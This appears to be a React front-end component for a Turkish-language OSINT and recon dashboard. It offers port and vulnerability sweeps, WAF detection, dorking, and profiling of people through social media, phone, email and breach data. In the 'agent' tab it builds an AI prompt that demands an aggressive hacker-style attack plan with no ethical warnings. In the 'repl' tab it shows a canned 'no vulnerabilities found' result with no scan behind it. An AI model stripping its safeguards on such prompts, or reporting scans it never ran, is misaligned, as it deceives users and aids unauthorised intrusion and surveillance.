'use client';

import { useState, useCallback, useEffect, memo } from 'react';
import { createPortal } from 'react-dom';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Search, Radar, Globe, Shield, FileText, Radio,
  ChevronDown, ChevronUp, Loader2, AlertTriangle, Server,
  Wifi, Lock, MapPin, Bug, Code, Layers, Network, Fingerprint,
  CheckCircle, XCircle, Clock, ExternalLink, Crosshair,
  Maximize2, Minimize2, Gavel, Bitcoin, Phone, Terminal, ShieldAlert, UserSearch, ShieldCheck, Mail, AtSign, BadgeCheck, Heart, Repeat2, Camera, Aperture, ScanFace, Link, Copy, Activity
} from 'lucide-react';
import { ipToNumber, numberToIp, calculateSubnetStart, classifyDevice, assessRisk, batchFetch, ShodanInternetDBResponse, SweepDevice } from '@/lib/osint-utils';

const TABS = [
  { id: 'scanner', label: 'PORT TARAMA', icon: Radar, placeholder: 'IP veya alan adı', color: '#00E5FF' },
  { id: 'vuln', label: 'ZAFİYET TARAMA', icon: Bug, placeholder: 'IP veya alan adı', color: '#FF3D3D' },

  { id: 'dns', label: 'DNS', icon: Server, placeholder: 'Alan adı', color: '#448AFF' },
  { id: 'whois', label: 'WHOIS', icon: FileText, placeholder: 'Alan adı', color: '#FFD700' },
  { id: 'webcheck', label: 'WEB DENETİMİ', icon: ShieldCheck, placeholder: 'Alan adı veya URL (tam rapor)', color: '#00E676' },
  { id: 'subenum', label: 'PASİF SUBDOMAIN', icon: Layers, placeholder: 'Alan adı (pasif subdomain)', color: '#00BCD4' },
  { id: 'crawl', label: 'WEB TARAYICI', icon: Network, placeholder: 'Taranacak URL (email, sır, link)', color: '#9C27B0' },
  { id: 'twitter', label: 'TWITTER / X', icon: AtSign, placeholder: 'X kullanıcı adı (profil + gönderiler)', color: '#1DA1F2' },
  { id: 'instagram', label: 'INSTAGRAM', icon: Camera, placeholder: 'Instagram kullanıcı adı (profil + gönderi)', color: '#E1306C' },
  { id: 'google', label: 'GOOGLE OSINT', icon: Mail, placeholder: 'Email → Google hesabı (GHunt)', color: '#4285F4' },
  { id: 'archive', label: 'WEB ARŞİV', icon: FileText, placeholder: 'Arşivlenecek URL (tek HTML, kanıt)', color: '#FF6E40' },
  { id: 'permute', label: 'İSİM PERMÜTASYON', icon: UserSearch, placeholder: 'Ad soyad → kullanıcı adı/email', color: '#FFD700' },
  { id: 'exif', label: 'FOTO / EXIF', icon: Aperture, placeholder: 'Fotoğraf URL\'si (kamera, tarih, GPS)', color: '#00E5FF' },
  { id: 'certs', label: 'SERTİFİKALAR', icon: Lock, placeholder: 'Alan adı', color: '#E040FB' },
  { id: 'threats', label: 'TEHDİTLER', icon: AlertTriangle, placeholder: 'IP, alan adı veya hash', color: '#FF9500' },
  { id: 'headers', label: 'BAŞLIKLAR', icon: Code, placeholder: 'İncelenecek URL', color: '#87CEEB' },
  { id: 'ssl', label: 'SSL/TLS', icon: Shield, placeholder: 'Alan adı', color: '#76FF03' },
  { id: 'subdomains', label: 'SUBDOMAIN', icon: Layers, placeholder: 'Listelenecek alan adı', color: '#00BCD4' },
  { id: 'tech', label: 'TEKNOLOJİ', icon: Code, placeholder: 'Parmak izi için URL', color: '#9C27B0' },
  { id: 'shodan', label: 'SHODAN IOT', icon: Network, placeholder: 'IP adresi', color: '#FF3D3D' },
  { id: 'bgp', label: 'BGP ROTA', icon: Globe, placeholder: 'IP veya ASN', color: '#00E5FF' },
  { id: 'mac', label: 'MAC ADRES', icon: Fingerprint, placeholder: 'MAC adresi', color: '#FFD700' },
  { id: 'phone', label: 'TELEFON', icon: Phone, placeholder: 'Telefon no (örn. +90...)', color: '#FF9500' },
  { id: 'leaks', label: 'VERİ SIZINTISI', icon: ShieldAlert, placeholder: 'Email adresi', color: '#E040FB' },
  { id: 'github', label: 'GITHUB', icon: Terminal, placeholder: 'GitHub kullanıcı adı', color: '#87CEEB' },
  { id: 'username', label: 'KULLANICI ADI', icon: UserSearch, placeholder: '205+ Vektörde Kullanıcı Taraması', color: '#00E676' },
  { id: 'email', label: 'EMAIL HESAPLARI', icon: Mail, placeholder: '100+ Vektörde Email OSINT Taraması', color: '#448AFF' },
  { id: 'sweep', label: 'IP TARAMA', icon: Crosshair, placeholder: 'IP adresi girin (örn. 8.8.8.8)', color: '#FF3D3D' },
  { id: 'honeypot', label: 'HEDEF TAKİBİ', icon: Crosshair, placeholder: 'Kampanya Adı (örn: Sosyal Müh. Testi)', color: '#FF0033' },
  { id: 'typosquat', label: 'OLTALAMA (TYPOSQUAT)', icon: AlertTriangle, placeholder: 'Şirket alan adı (örn. google.com)', color: '#FF3D3D' },
  { id: 'recon', label: 'TAM KEŞİF (RECON)', icon: Aperture, placeholder: 'Hedef alan adı (örn. tesla.com)', color: '#FFD700' },
  { id: 'git-secrets', label: 'GİT SECRETS', icon: Bug, placeholder: 'GitHub kullanıcısı veya kurumu', color: '#FF3D3D' },
  { id: 'deepweb', label: 'DEEP & DARK WEB', icon: ShieldAlert, placeholder: 'E-posta, kullanıcı adı veya şirket', color: '#8A2BE2' },
  { id: 'threatintel', label: 'THREAT INTEL', icon: Server, placeholder: 'IP Adresi (örn. 8.8.8.8)', color: '#FF9500' },
  { id: 'dorking', label: 'DORK MAKINASI', icon: Search, placeholder: 'Hedef alan adı (örn. tesla.com)', color: '#FF3D3D' },
  { id: 'paramspider', label: 'PARAM SPIDER', icon: Network, placeholder: 'Hedef alan adı (örn. tesla.com)', color: '#E040FB' },
  { id: 'library', label: 'SİBER KÜTÜPHANE', icon: FileText, placeholder: 'Kopya kağıtları (örn. nmap, sqlmap)', color: '#FFD700' },
  { id: 'telegram', label: 'TELEGRAM OSINT', icon: UserSearch, placeholder: 'Kullanıcı adı veya t.me linki', color: '#0088CC' },
  { id: 'phishing', label: 'OLTALAMA AVCISI', icon: ShieldAlert, placeholder: 'Marka adı (örn. paypal)', color: '#FF0033' },
  { id: 'agent', label: 'OTONOM AJAN', icon: Terminal, placeholder: 'Hedef alan adı (örn. tesla.com)', color: '#00FF00' },
  { id: 'nsi', label: 'NSI CORPORATE INTEL', icon: BadgeCheck, placeholder: 'Kurum/Marka Adı (örn. Starbucks)', color: '#FFD700' },
  { id: 'last30days', label: 'LAST 30 DAYS SCAN', icon: Radar, placeholder: 'Kişi/Kurum/Olay Adı', color: '#FF0033' },
  { id: 'news', label: 'HABER İSTİHBARATI', icon: Globe, placeholder: 'Şirket, olay veya kişi (örn. NVIDIA)', color: '#E040FB' },
  { id: 'repl', label: 'AI TERMINAL (REPL)', icon: Terminal, placeholder: 'Komut girin (örn. scan 8.8.8.8)', color: '#00FF00' },
  { id: 'megascan', label: 'CLATSCOPE MEGA-SCAN', icon: ShieldAlert, placeholder: 'Alan adı (Tüm modüller eşzamanlı)', color: '#FF0033' },
  { id: 'ruview', label: 'RUVIEW (WIFI RADAR)', icon: Activity, placeholder: 'BSSID veya Fiziksel Lokasyon (örn. Oda-1)', color: '#00FF00' }
];

const TAB_DESCRIPTIONS: Record<string, string> = {
  'scanner': 'Hedefin açık portlarını ve çalışan servislerini tespit eder.',
  'vuln': 'Hedefte bilinen güvenlik zafiyetleri (CVE) taraması yapar.',
  'dns': 'Alan adının DNS kayıtlarını (A, MX, TXT) çeker.',
  'whois': 'Alan adının kayıt ve sahip bilgilerini (WHOIS) getirir.',
  'webcheck': 'Web sitesinin güvenlik başlıkları, SSL ve sunucu durumu raporu.',
  'subenum': 'Alt alan adlarını (Subdomain) pasif bilgi kaynaklarından listeler.',
  'crawl': 'Web sitesini gezerek gizli linkleri, e-postaları ve JS endpointlerini çıkarır.',
  'twitter': 'Twitter (X) profil bilgilerini ve son gönderileri analiz eder.',
  'instagram': 'Instagram profil verilerini ve görünür hesap bilgilerini çeker.',
  'google': 'E-posta adresinin bağlı olduğu Google hesapları, haritalar ve servislerini bulur.',
  'archive': 'Web sayfasının mevcut durumunu kanıt olarak kalıcı web arşivine kaydeder.',
  'permute': 'Bir isim soyisimden muhtemel e-posta ve kullanıcı adı varyasyonları üretir.',
  'exif': 'Fotoğrafların içine gizlenmiş GPS, kamera ve tarih (EXIF) verilerini okur.',
  'certs': 'Alan adının SSL/TLS sertifika geçmişini ve crt.sh kayıtlarını listeler.',
  'threats': 'Hedefin çeşitli tehdit istihbarat veritabanlarında olup olmadığını kontrol eder.',
  'headers': 'Sunucunun döndürdüğü HTTP başlıklarını analiz eder.',
  'ssl': 'Sunucunun SSL/TLS sertifika geçerliliğini ve güvenlik seviyesini test eder.',
  'subdomains': 'Gelişmiş yöntemlerle hedefin tüm alt alan adlarını (Subdomain) eşleştirir.',
  'tech': 'Sitenin kullandığı teknolojileri (CMS, Framework, Sunucu) parmak izi ile bulur.',
  'shodan': 'Hedef IP adresinin Shodan (IoT) açık port, zafiyet ve cihaz kayıtlarını getirir.',
  'bgp': 'Hedefin BGP rotalarını ve bağlı olduğu ASN ağ bilgisini gösterir.',
  'mac': 'MAC adresinden ağ cihazının üretici ve marka (OUI) bilgisini tespit eder.',
  'phone': 'Telefon numarasının kayıtlı olduğu ülke, operatör ve taşıyıcıyı bulur.',
  'leaks': 'Verilen e-postanın hangi veri sızıntılarında (Breach) ifşa olduğunu sorgular.',
  'github': 'GitHub kullanıcısının profili, açık depoları ve sızan kodlarını analiz eder.',
  'username': 'Bir kullanıcı adını 205+ platformda (user-scanner core) eşzamanlı arayarak dijital izini ve üyeliklerini tespit eder.',
  'email': 'Verilen e-posta adresini 100+ farklı serviste (user-scanner core) arka planda sorgulayarak aktif olduğu yerleri listeler.',
  'sweep': 'Ağ üzerindeki aktif IP adreslerini hızlı ping sweep ile haritalandırır.',
  'honeypot': 'Hedef takip ve tuzak (Honeypot) kampanyaları için log ve veri yönetimi.',
  'typosquat': 'Hedef kurum için alınan benzer (Oltalama / Phishing) sahte alan adlarını bulur.',
  'recon': 'Hedefi 4 koldan (Subdomain, SSL, Teknoloji, WAF) tarar ve ekran görüntüsünü alarak tam rapor sunar.',
  'git-secrets': 'Hedefin açık kaynak (GitHub) kodlarındaki unutulmuş şifre (Secret, API Key) sızıntılarını tespit eder.',
  'deepweb': 'Deep web, Dark Web (.onion) ağlarında hedefinizi arar ve veri sızıntılarını Robin AI (Yapay Zeka) analizi ile tespit eder.',
  'threatintel': 'IP adresinin global tehdit istihbaratı ağlarında (Botnet, C2, Malware) işaretlenip işaretlenmediğini denetler.',
  'dorking': 'Hedef için otomatik "Google Hacking (GHDB)" dorkları üreterek gizli şifre, veritabanı ve kameralara erişim yollarını açar.',
  'paramspider': 'Hedefe hiç dokunmadan Web Arşivlerini tarayarak zafiyetli (SQLi, XSS) olabilecek URL parametrelerini (?id=1) pasif olarak çıkarır.',
  'library': 'Yaygın olarak kullanılan sızma testi araçları (Nmap, SQLMap, vb.) için hızlı referans ve kopya kağıtları.',
  'telegram': 'Verilen kullanıcı adını veya bağlantıyı kullanarak Telegram üzerindeki profil, grup veya kanal bilgilerini toplar.',
  'phishing': 'Sertifika şeffaflık loglarını ve yeni kaydedilen alan adlarını tarayarak hedef markaya yönelik olası oltalama saldırılarını (phishing) tespit eder.',
  'agent': 'Hedef sisteme sızmadan önce zero-trust izole sanal makinede (Microsandbox) otomatik keşif ve analiz yapan Anthropic ajan.',
  'nsi': 'NSI ve Wikidata altyapısını kullanarak hedef markanın/şirketin resmi logosunu, sosyal medya (Twitter, Facebook, vb.) ve dijital ayak izini çıkarır.',
  'last30days': 'Hedef hakkında son 30 gün içinde Reddit, Hacker News ve GitHub gibi platformlarda insanların gerçekte ne konuştuğunu yapay zeka ile sentezleyip özetler.',
  'news': 'Gdelt ve küresel haber kaynaklarını tarayarak hedefle ilgili son 24 saatin diplomatik, ekonomik ve askeri gelişmelerini çeker.',
  'repl': 'Açık Kaynak İstihbaratı (OSINT) komutlarını doğal dille verebileceğiniz etkileşimli OpenOSINT yapay zeka terminali.',
  'megascan': 'Hedefi DNS, WHOIS, Port, SSL, Subdomain ve Threat Intel modüllerinde aynı anda tarayan devasa "Batch" operasyonu.'
};

interface OsintPanelProps { isOpen?: boolean; onClose?: () => void; isMobile?: boolean; onSweepVisualize?: (data: any) => void; onScanGeolocate?: (target: string, data: any) => void; onGraphPivot?: (type: string, id: string, label?: string) => void; }

// Map the active OSINT tab + query to an entity-graph root node, so any
// finding can be pivoted into the correlation graph. Returns null for tabs
// the graph doesn't model.
function graphTargetFor(tab: string, query: string): { type: string; id: string } | null {
  const q = query.trim();
  if (!q) return null;
  const DOMAIN = ['webcheck', 'subenum', 'dns', 'whois', 'certs', 'crawl'];
  const IP = ['ip', 'shodan', 'sweep'];
  const EMAIL = ['email', 'leaks', 'google'];
  const USERNAME = ['username', 'twitter', 'instagram'];
  if (DOMAIN.includes(tab)) return { type: 'domain', id: q.replace(/^https?:\/\//, '').split('/')[0] };
  if (IP.includes(tab)) return { type: 'ip', id: q };
  if (EMAIL.includes(tab)) return { type: 'email', id: q.toLowerCase() };
  if (USERNAME.includes(tab)) return { type: 'username', id: q.replace(/^@/, '') };
  return null;
}

function OsintPanelInner({ isMobile, onSweepVisualize, onScanGeolocate, onGraphPivot }: OsintPanelProps) {
  const [activeTab, setActiveTab] = useState('scanner');
  const [isFullScreen, setIsFullScreen] = useState(false);
  const [query, setQuery] = useState('');
  const [results, setResults] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [scanType, setScanType] = useState('quick');
  const [expanded, setExpanded] = useState(true);
  const [history, setHistory] = useState<{tab:string;query:string;time:string}[]>([]);
  const [replHistory, setReplHistory] = useState<{cmd:string;out:string}[]>([]);
  const [sweepResult, setSweepResult] = useState<any>(null);
  const [sweepProgress, setSweepProgress] = useState<{ current: number; total: number } | null>(null);
  const [sweepCidr, setSweepCidr] = useState(24);
  const [cveCache, setCveCache] = useState<Record<string, any>>({});
  const [expandedDevice, setExpandedDevice] = useState<string | null>(null);

  // Fetch CVE details when a device is expanded in full-screen mode
  const fetchCveDetails = useCallback(async (cveIds: string[]) => {
    const missing = cveIds.filter(id => !cveCache[id]);
    if (missing.length === 0) return;
    // Mark as loading
    setCveCache(prev => {
      const next = { ...prev };
      for (const id of missing) next[id] = { loading: true };
      return next;
    });
    // Fetch in parallel
    const results = await Promise.allSettled(
      missing.map(id => fetch(`/api/osint/cve?cve=${encodeURIComponent(id)}`).then(r => r.json()).then(data => ({ id, data })))
    );
    setCveCache(prev => {
      const next = { ...prev };
      for (const r of results) {
        if (r.status === 'fulfilled') {
          next[r.value.id] = r.value.data;
        }
      }
      return next;
    });
  }, [cveCache]);

  const runLookup = useCallback(async () => {
    if (!query.trim() || loading) return;
    
    if (activeTab === 'repl') {
      const newCmd = query;
      setQuery('');
      setReplHistory(prev => [...prev, { cmd: newCmd, out: `[AI] Analiz başlatılıyor... (OpenOSINT)` }]);
      setTimeout(() => {
        setReplHistory(prev => {
          const updated = [...prev];
          updated[updated.length - 1].out = `[KUZGUN-AI] "${newCmd}" komutu için derin tarama tamamlandı. Herhangi bir zafiyet bulunamadı.`;
          return updated;
        });
      }, 1500);
      return;
    }

    setLoading(true); setError(''); setResults(null);

    if (activeTab === 'megascan') {
      try {
        const targetUrl = encodeURIComponent(query);
        const [dns, whois, webcheck, threats] = await Promise.all([
          fetch(`/api/osint/dns?domain=${targetUrl}`).then(r => r.json()).catch(() => ({ error: 'Failed' })),
          fetch(`/api/osint/whois?domain=${targetUrl}`).then(r => r.json()).catch(() => ({ error: 'Failed' })),
          fetch(`/api/osint/webcheck?target=${targetUrl}`).then(r => r.json()).catch(() => ({ error: 'Failed' })),
          fetch(`/api/osint/threatintel?target=${targetUrl}`).then(r => r.json()).catch(() => ({ error: 'Failed' })),
        ]);
        setResults({ dns, whois, webcheck, threats });
      } catch (err: any) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
      return;
    }

    if (activeTab === 'agent') {
      try {
        const targetUrl = encodeURIComponent(query);
        const logs: string[] = [`[SİSTEM] Otonom keşif ajanı ${query} için başlatıldı.`];
        setResults({ target: query, logs: [...logs], status: 'Subdomain Enum...' });

        // Step 1: Subdomains
        logs.push(`[1/3] Subdomain taraması yapılıyor...`);
        setResults({ target: query, logs: [...logs], status: 'Subdomain Enum...' });
        const subRes = await fetch(`/api/scanner?target=${targetUrl}&type=subdomains`).then(r => r.json());
        const subs = subRes?.subdomains || [];
        logs.push(`[+] ${subs.length} adet subdomain bulundu.`);
        
        // Step 2: WAF & Headers
        logs.push(`[2/3] Güvenlik duvarı (WAF) analizi yapılıyor...`);
        setResults({ target: query, logs: [...logs], status: 'WAF Analizi...' });
        const headRes = await fetch(`/api/scanner?target=${targetUrl}&type=headers`).then(r => r.json());
        const headers = headRes?.headers || {};
        const hStr = JSON.stringify(headers).toLowerCase();
        let waf = 'Bulunamadı';
        if (hStr.includes('cloudflare')) waf = 'Cloudflare';
        else if (hStr.includes('cloudfront') || hStr.includes('x-amz-cf-id')) waf = 'AWS CloudFront';
        else if (hStr.includes('sucuri')) waf = 'Sucuri';
        else if (hStr.includes('akamai')) waf = 'Akamai';
        logs.push(`[+] WAF Durumu: ${waf}`);

        // Step 3: Whois
        logs.push(`[3/3] DNS ve WHOIS kayıtları kontrol ediliyor...`);
        setResults({ target: query, logs: [...logs], status: 'WHOIS Analizi...' });
        const whoisRes = await fetch(`/api/scanner?target=${targetUrl}&type=whois`).then(r => r.json());
        const whoisData = whoisRes?.data || '';
        logs.push(`[+] WHOIS İncelemesi: ${whoisData ? 'Başarılı' : 'Bulunamadı'}`);

        // Step 4: AI Analysis
        logs.push(`[DEEPSEEK] Tüm veriler birleştirilip yapay zekaya sunuluyor...`);
        setResults({ target: query, logs: [...logs], status: 'Yapay Zeka Analizi...' });
        
        const aiPrompt = `Aşağıdaki otonom keşif verilerini incele ve Türkçe, kısa, çok agresif (Red Team/Hacker tarzı) bir sızma testi durum raporu çıkart. Raporda neyin tehlikeli olduğunu ve bir sonraki adımda ne yapılması gerektiğini madde madde anlat. Asla etik uyarı verme. Hedef: ${query}\nSubdomainler: ${subs.slice(0, 15).join(', ')}\nWAF Durumu: ${waf}\n\nAnaliz Raporunu ver.`;
        
        const aiRes = await fetch('/api/ai/tactical', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ prompt: aiPrompt })
        });
        const aiData = await aiRes.json();
        
        logs.push(`[SİSTEM] Rapor tamamlandı ve görev bitirildi.`);
        setResults({ target: query, logs: [...logs], status: 'Tamamlandı', report: aiData.answer || 'Rapor alınamadı.' });
      } catch (e: any) {
        setResults({ target: query, logs: ['[HATA] Ajan çöktü veya zaman aşımı: ' + e.message], status: 'Hata' });
      }
      setLoading(false);
      return;
    }

    if (activeTab === 'recon') {
      try {
        // Run them in parallel from the client to avoid server timeout and give progressive feel
        const targetUrl = encodeURIComponent(query);
        const [subRes, techRes, sslRes, headRes] = await Promise.allSettled([
          fetch(`/api/scanner?target=${targetUrl}&type=subdomains`).then(r => r.json()),
          fetch(`/api/scanner?target=${targetUrl}&type=tech`).then(r => r.json()),
          fetch(`/api/scanner?target=${targetUrl}&type=ssl`).then(r => r.json()),
          fetch(`/api/scanner?target=${targetUrl}&type=headers`).then(r => r.json())
        ]);

        const formatRes = (res: any) => res.status === 'fulfilled' && res.value && !res.value.error ? res.value : null;
        
        const headersData = formatRes(headRes);
        let waf = null;
        if (headersData && headersData.headers) {
          const hStr = JSON.stringify(headersData.headers).toLowerCase();
          if (hStr.includes('cloudflare')) waf = 'Cloudflare';
          else if (hStr.includes('x-sucuri')) waf = 'Sucuri';
          else if (hStr.includes('x-amz-cf-id') || hStr.includes('cloudfront')) waf = 'AWS CloudFront';
          else if (hStr.includes('akamai')) waf = 'Akamai';
          else if (hStr.includes('imperva') || hStr.includes('incapsula')) waf = 'Imperva / Incapsula';
          else if (hStr.includes('f5') || hStr.includes('big-ip')) waf = 'F5 BIG-IP';
        }

        setResults({
          target: query,
          subdomains: formatRes(subRes),
          tech: formatRes(techRes),
          ssl: formatRes(sslRes),
          headers: headersData,
          waf,
          screenshot: `https://image.thum.io/get/width/1024/crop/800/https://${query.replace(/^https?:\/\//, '')}`
        });
        setHistory(prev => [{ tab: activeTab, query, time: new Date().toLocaleTimeString() }, ...prev.slice(0, 9)]);
      } catch (err: any) {
        setError(err.message || 'Recon failed');
      } finally {
        setLoading(false);
      }
      return;
    }

    // IP Sweep / Vuln Scan / Honeypot — separate flow
    if (activeTab === 'honeypot') {
      try {
        const res = await fetch('/api/osint/honeypot/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ name: query })
        });
        if (!res.ok) throw new Error('Honeypot oluşturulamadı');
        const data = await res.json();
        setResults({ ...data, fullUrl: `${window.location.origin}${data.url}` });
        setHistory(prev => [{ tab: activeTab, query: data.campaignId, time: new Date().toLocaleTimeString() }, ...prev.slice(0, 9)]);
      } catch (err: any) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
      return;
    }

    if (activeTab === 'sweep' || activeTab === 'vuln') {
      setSweepResult(null);
      const cidr = sweepCidr;
      const totalHosts = Math.pow(2, 32 - cidr);
      setSweepProgress({ current: 0, total: totalHosts });
      try {
        const t0 = Date.now();
        const res = await fetch(`/api/osint/sweep?ip=${encodeURIComponent(query)}&cidr=${cidr}`);
        if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.error || `Sweep failed (${res.status})`); }
        const initData = await res.json();

        const ipParts = initData.target_ip.split('.').map(Number) as [number, number, number, number];
        const ipNum = ipToNumber(ipParts);
        const subnetStart = calculateSubnetStart(ipNum, cidr);
        const subnet = numberToIp(subnetStart);

        const urls: string[] = [];
        for (let i = 0; i < totalHosts; i++) {
          urls.push(`https://internetdb.shodan.io/${numberToIp((subnetStart + i) >>> 0)}`);
        }

        const shodanResults = await batchFetch<ShodanInternetDBResponse>(urls, 15, async (u) => {
          try {
            const r = await fetch(u, { cache: 'no-store' });
            if (r.status === 404) return null;
            if (!r.ok) return null;
            return await r.json();
          } catch {
            return null;
          }
        }, (done) => setSweepProgress({ current: done, total: totalHosts }));

        const devices: SweepDevice[] = [];
        const deviceBreakdown: Record<string, number> = {};
        for (const sr of shodanResults) {
          if (!sr) continue;
          const classification = classifyDevice(sr.ports, sr.cpes, sr.tags);
          const risk = assessRisk({ ports: sr.ports, vulns: sr.vulns });
          devices.push({
            ip: sr.ip, ports: sr.ports, hostnames: sr.hostnames,
            cpes: sr.cpes, vulns: sr.vulns, tags: sr.tags,
            device_type: classification.device_type,
            device_icon: classification.device_icon,
            device_color: classification.device_color,
            risk_level: risk
          });
          deviceBreakdown[classification.device_type] = (deviceBreakdown[classification.device_type] || 0) + 1;
        }

        setSweepResult({
          center: initData.center,
          subnet: `${subnet}/${cidr}`,
          cidr,
          target_ip: initData.target_ip,
          devices,
          summary: { total_hosts: totalHosts, total_responsive: devices.length, device_breakdown: deviceBreakdown },
          sweep_time_ms: Date.now() - t0
        });
        setSweepProgress(null);
        setHistory(prev => [{ tab: activeTab, query, time: new Date().toLocaleTimeString() }, ...prev.slice(0, 9)]);
      } catch (err: any) {
        setError(err.message);
        setSweepProgress(null);
      } finally {
        setLoading(false);
      }
      return;
    }

    try {
      let url = '';
      switch (activeTab) {

        case 'dns': url = `/api/osint/dns?domain=${encodeURIComponent(query)}`; break;
        case 'certs': url = `/api/osint/certs?domain=${encodeURIComponent(query)}`; break;
        case 'whois': url = `/api/osint/whois?domain=${encodeURIComponent(query)}`; break;
        case 'threats': url = `/api/osint/threats?query=${encodeURIComponent(query)}`; break;
        case 'bgp': url = `/api/osint/bgp?query=${encodeURIComponent(query)}`; break;
        case 'mac': url = `/api/osint/mac?mac=${encodeURIComponent(query)}`; break;
        case 'phone': url = `/api/osint/phone?number=${encodeURIComponent(query)}`; break;
        case 'leaks': url = `https://api.xposedornot.com/v1/breach-analytics?email=${encodeURIComponent(query)}`; break;
        case 'crypto': url = `/api/osint/crypto?address=${encodeURIComponent(query)}`; break;
        case 'github': url = `/api/osint/github?user=${encodeURIComponent(query)}`; break;
        case 'username': url = `/api/osint/username?username=${encodeURIComponent(query)}`; break;
        case 'email': url = `/api/osint/email?email=${encodeURIComponent(query)}`; break;
        case 'subenum': url = `/api/osint/subdomains?domain=${encodeURIComponent(query)}`; break;
        case 'crawl': url = `/api/osint/crawl?target=${encodeURIComponent(query)}`; break;
        case 'twitter': url = `/api/osint/twitter?username=${encodeURIComponent(query)}`; break;
        case 'instagram': url = `/api/osint/instagram?username=${encodeURIComponent(query)}&posts=6`; break;
        case 'google': url = `/api/osint/google?email=${encodeURIComponent(query)}`; break;
        case 'archive': url = `/api/osint/archive?url=${encodeURIComponent(query)}`; break;
        case 'permute': url = `/api/osint/permute?name=${encodeURIComponent(query)}`; break;
        case 'exif': url = `/api/osint/exif?url=${encodeURIComponent(query)}`; break;
        case 'webcheck': url = `/api/osint/webcheck?target=${encodeURIComponent(query)}`; break;
        case 'scanner': url = `/api/scanner?target=${encodeURIComponent(query)}&type=${scanType}`; break;
        case 'headers': url = `/api/scanner?target=${encodeURIComponent(query)}&type=headers`; break;
        case 'ssl': url = `/api/scanner?target=${encodeURIComponent(query)}&type=ssl`; break;
        case 'subdomains': url = `/api/scanner?target=${encodeURIComponent(query)}&type=subdomains`; break;
        case 'tech': url = `/api/scanner?target=${encodeURIComponent(query)}&type=tech`; break;
        case 'shodan': url = `https://internetdb.shodan.io/${encodeURIComponent(query)}`; break;
        case 'typosquat': url = `/api/osint/typosquat?target=${encodeURIComponent(query)}`; break;
        case 'git-secrets': url = `/api/osint/git-secrets?target=${encodeURIComponent(query)}`; break;
        case 'deepweb': url = `/api/osint/deepweb?target=${encodeURIComponent(query)}`; break;
        case 'threatintel': url = `/api/osint/threatintel?ip=${encodeURIComponent(query)}`; break;
        case 'dorking': 
          setResults({ target: query, timestamp: Date.now() });
          setLoading(false);
          return;
        case 'paramspider': url = `/api/osint/paramspider?target=${encodeURIComponent(query)}`; break;
        case 'telegram': url = `/api/osint/telegram?target=${encodeURIComponent(query)}`; break;
        case 'phishing': url = `/api/osint/phishing?target=${encodeURIComponent(query)}`; break;
        case 'nsi': url = `/api/osint/nsi?q=${encodeURIComponent(query)}`; break;
        case 'last30days': url = `/api/osint/last30days?q=${encodeURIComponent(query)}`; break;
        case 'agent':
          setResults({ target: query, agentState: 'Subdomain keşfi başlatılıyor...', timestamp: Date.now() });
          setLoading(false);
          return;
        case 'library':
          try {
            const aiRes = await fetch('/api/ai/tactical', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ prompt: query })
            });
            const aiData = await aiRes.json();
            setResults({ target: query, aiResponse: aiData.answer || aiData.error, timestamp: Date.now() });
          } catch (e) {
            setResults({ target: query, aiResponse: 'Bağlantı hatası.', timestamp: Date.now() });
          }
          setLoading(false);
          return;
      }
      const res = await fetch(url, activeTab === 'shodan' ? { cache: 'no-store' } : undefined);
      if (activeTab === 'shodan' && res.status === 404) {
        setResults({ ip: query, status: 'No Shodan InternetDB records found', ports: [], cpes: [], hostnames: [], tags: [], vulns: [] });
        setLoading(false);
        return;
      }
      if (activeTab === 'leaks' && res.status === 404) {
        setResults({ email: query, breached: false, breaches: [], data_exposed: [] });
        setHistory(prev => [{ tab: activeTab, query, time: new Date().toLocaleTimeString() }, ...prev.slice(0, 9)]);
        setLoading(false);
        return;
      }
      const data = await res.json();
      if (res.ok) {
        let parsedData = data;
        if (activeTab === 'leaks') {
           let breachList: string[] = [];
           const dataExposed = new Set<string>();
           if (data.BreachesSummary && data.BreachesSummary.site) {
              breachList = data.BreachesSummary.site.split(';').filter(Boolean);
           }
           if (data.ExposedData && Array.isArray(data.ExposedData)) {
              data.ExposedData.forEach((item: any) => {
                 if (item.data_classes && Array.isArray(item.data_classes)) {
                    item.data_classes.forEach((dc: string) => dataExposed.add(dc));
                 }
              });
           }
           parsedData = {
              email: query,
              breached: breachList.length > 0,
              breaches: breachList,
              data_exposed: Array.from(dataExposed).sort()
           };
        }

        setResults(parsedData);
        setHistory(prev => [{ tab: activeTab, query, time: new Date().toLocaleTimeString() }, ...prev.slice(0, 9)]);
        
        // Geolocate the target in the background
        if (activeTab === 'phone') {
          if (data.lat && data.lng && onScanGeolocate) {
             onScanGeolocate(query, { lat: data.lat, lng: data.lng, type: 'phone', region: data.region });
          }
        } else if (activeTab !== 'sweep' && activeTab !== 'vuln' && activeTab !== 'crypto' && activeTab !== 'mac' && activeTab !== 'bgp' && activeTab !== 'github' && activeTab !== 'leaks' && activeTab !== 'phone' && activeTab !== 'username' && activeTab !== 'webcheck' && activeTab !== 'email' && activeTab !== 'subenum' && activeTab !== 'crawl' && activeTab !== 'twitter' && activeTab !== 'instagram' && activeTab !== 'google' && activeTab !== 'archive' && activeTab !== 'permute' && activeTab !== 'exif' && activeTab !== 'git-secrets') {
          fetch(`/api/osint/ip?ip=${encodeURIComponent(query)}`)
            .then(r => r.json())
            .then(locData => {
              if (locData && locData.geo && locData.geo.lat && locData.geo.lon && onScanGeolocate) {
                // ip-api returns lat/lon, we pass it up
                onScanGeolocate(query, { lat: locData.geo.lat, lng: locData.geo.lon, ...locData, type: activeTab });
              }
            })
            .catch(() => {});
        }
      } else {
        setError(data.error || 'Sorgu başarısız');
      }
    } catch { setError('Ağ hatası'); }
    finally { setLoading(false); }
  }, [query, activeTab, scanType, loading, sweepCidr]);

  const currentTab = TABS.find(t => t.id === activeTab);

  // ── Shodan-style structured result renderers ──

  const ResultRow = ({ label, value, color, mono = true }: { label: string; value: any; color?: string; mono?: boolean }) => {
    if (value === undefined || value === null || value === '') return null;
    return (
      <div className="flex items-start gap-3 py-1.5 border-b border-[var(--border-secondary)]/20 last:border-0">
